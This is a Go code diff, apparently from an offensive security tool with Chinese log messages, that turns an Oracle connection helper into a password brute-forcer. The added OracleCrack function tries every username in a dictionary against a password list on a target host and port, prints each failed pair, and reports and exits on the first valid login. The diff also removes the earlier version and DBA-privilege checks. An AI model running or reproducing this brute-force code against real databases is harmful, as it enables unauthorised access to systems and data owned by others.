@@ -4,42 +4,40 @@ import (
 	"database/sql"
 	"fmt"
 	_ "github.com/godror/godror"
+	"os"
 	"strings"
 )
 
-func OracleConnect(ruser string, pwd string, rhost string, rport string, sid string) (conn *sql.DB, err error) {
+func OracleConnect(ruser string, pwd string, rhost string, rport string, sid string) (conn *sql.DB, err error, sign bool) {
 	conn, err = sql.Open("godror", fmt.Sprintf(`user=%s password="%s" connectString="%s:%s/%s"`, ruser, pwd, rhost, rport, sid))
 	if err != nil {
-		Info("连接出错")
+		return nil, nil, false
 	}
 	err = conn.Ping()
 	if err != nil {
-		Err(err)
+		return nil, nil, false
 	}
 	Info("Oracle数据库连接成功")
-	resultSet, err := OracleCMD(fmt.Sprintf("select version from v$instance"), conn)
-	for _, m := range resultSet {
-		for _, value := range m {
-			//fmt.Println(fmt.Sprintf("%s", value))
-			Info(fmt.Sprintf("当前数据库版本为：%s", value))
-		}
-	}
 	if err != nil {
-		Err(err)
+		return nil, nil, false
 	}
+	sign = true
+	return conn, nil, sign
+}
 
-	// isdba, err := OracleCMD(fmt.Sprintf("select userenv('ISDBA') from dual"), conn)
-	isdba, err := OracleCMD("select userenv('ISDBA') from dual", conn)
-	for _, m := range isdba {
-		for _, value := range m {
-			fmt.Println(fmt.Sprintf("%s", value))
-			if strings.ToLower(fmt.Sprintf("%s", value)) == "true" {
-				Success("当前账号为DBA权限")
+func OracleCrack(Rhost string, Rport string) {
+	Info("开始爆破,请稍等.....")
+	sign = false
+	for _, user := range Userdict["oracle"] {
+		for _, pass := range Passwords {
+			pass = strings.Replace(pass, "{user}", user, -1)
+			_, _, sign := OracleConnect(user, pass, Rhost, Rport, "orcl")
+			if sign == true {
+				Success(fmt.Sprintf("账号密码为：%s:%s", user, pass))
+				os.Exit(0)
 			} else {
-				Info("当前账号非DBA权限")
+				fmt.Println(fmt.Sprintf("%s:%s 未成功爆破出账号密码", user, pass))
 			}
 		}
 	}
-
-	return conn, nil
 }
